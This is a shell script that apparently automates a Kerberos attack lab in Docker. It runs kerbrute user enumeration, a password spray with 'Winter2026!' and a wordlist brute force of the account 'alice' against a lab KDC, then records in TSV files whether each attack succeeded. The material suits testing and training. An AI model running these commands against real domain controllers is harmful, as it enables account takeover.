#!/usr/bin/env sh
set -eu

SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
TARGET_HOST="${TARGET_HOST:-172.66.88.20}"
REALM="${REALM:-PACKETLAB.LOCAL}"
SPRAY_PASS="${SPRAY_PASS:-Winter2026!}"

docker compose -f "$SCRIPT_DIR/docker-compose.yml" exec -T scanner sh -s -- \
  "$TARGET_HOST" "$REALM" "$SPRAY_PASS" <<'EOF'
set -eu

TARGET_HOST="$1"
REALM="$2"
SPRAY_PASS="$3"
OUTPUT_DIR="/work/outputs"
USERS="/work/wordlists/users.txt"
PASSWORDS="/work/wordlists/passwords.txt"

mkdir -p "$OUTPUT_DIR"
rm -f "$OUTPUT_DIR"/*.txt "$OUTPUT_DIR"/*.tsv "$OUTPUT_DIR"/*.log

for _ in $(seq 1 60); do
  if printf '%s\n' "$SPRAY_PASS" | kinit "alice@$REALM" >/dev/null 2>&1; then
    kdestroy >/dev/null 2>&1 || true
    break
  fi
  sleep 1
done

nc -vz "$TARGET_HOST" 88 > "$OUTPUT_DIR/kdc-port.txt" 2>&1 || true
kerbrute --help > "$OUTPUT_DIR/help.txt" 2>&1 || true
kerbrute version > "$OUTPUT_DIR/version.txt" 2>&1 || true

kerbrute userenum \
  --dc "$TARGET_HOST" \
  --domain "$REALM" \
  --threads 2 \
  "$USERS" \
  > "$OUTPUT_DIR/userenum.txt" 2>&1 || true

kerbrute passwordspray \
  --dc "$TARGET_HOST" \
  --domain "$REALM" \
  --threads 2 \
  "$USERS" \
  "$SPRAY_PASS" \
  > "$OUTPUT_DIR/passwordspray.txt" 2>&1 || true

kerbrute bruteuser \
  --dc "$TARGET_HOST" \
  --domain "$REALM" \
  --threads 2 \
  "$PASSWORDS" \
  alice \
  > "$OUTPUT_DIR/bruteuser-alice.txt" 2>&1 || true

printf '%s\n' "$SPRAY_PASS" | kinit "alice@$REALM" \
  > "$OUTPUT_DIR/kinit-success.txt" 2>&1 || true
kdestroy >/dev/null 2>&1 || true
printf '%s\n' "wrong-password" | kinit "alice@$REALM" \
  > "$OUTPUT_DIR/kinit-failure.txt" 2>&1 || true

{
  printf 'check\tstatus\n'
  if grep -Eiq 'kerbrute|usage' "$OUTPUT_DIR/help.txt"; then
    printf 'help_available\tyes\n'
  else
    printf 'help_available\tno\n'
  fi
  if grep -Eq 'alice|bob|svc-backup' "$OUTPUT_DIR/userenum.txt"; then
    printf 'valid_users_seen\tyes\n'
  else
    printf 'valid_users_seen\tno\n'
  fi
  if grep -Eiq 'valid login|alice|Winter2026' "$OUTPUT_DIR/passwordspray.txt"; then
    printf 'passwordspray_success_seen\tyes\n'
  else
    printf 'passwordspray_success_seen\tno\n'
  fi
  if grep -Eiq 'valid login|alice|Winter2026' "$OUTPUT_DIR/bruteuser-alice.txt"; then
    printf 'bruteuser_success_seen\tyes\n'
  else
    printf 'bruteuser_success_seen\tno\n'
  fi
  if grep -Eiq 'Password incorrect|preauthentication failed|Client not found|Cannot contact' "$OUTPUT_DIR/kinit-failure.txt"; then
    printf 'bad_auth_rejected\tyes\n'
  else
    printf 'bad_auth_rejected\tno\n'
  fi
} > "$OUTPUT_DIR/validation.tsv"

{
  printf 'item\tvalue\n'
  printf 'target\t%s\n' "$TARGET_HOST"
  printf 'realm\t%s\n' "$REALM"
  printf 'userenum_matches\t%s\n' "$(grep -Eci 'valid username|alice|bob|svc-backup' "$OUTPUT_DIR/userenum.txt" || true)"
  printf 'passwordspray_matches\t%s\n' "$(grep -Eci 'valid login|alice|Winter2026' "$OUTPUT_DIR/passwordspray.txt" || true)"
  printf 'bruteuser_matches\t%s\n' "$(grep -Eci 'valid login|alice|Winter2026' "$OUTPUT_DIR/bruteuser-alice.txt" || true)"
  printf 'validation_passed\t%s\n' "$(awk -F'\t' 'NR > 1 && $2 == "yes" {count++} END {print count + 0}' "$OUTPUT_DIR/validation.tsv")"
} > "$OUTPUT_DIR/summary.tsv"
EOF

echo "Generated Kerbrute lab outputs."
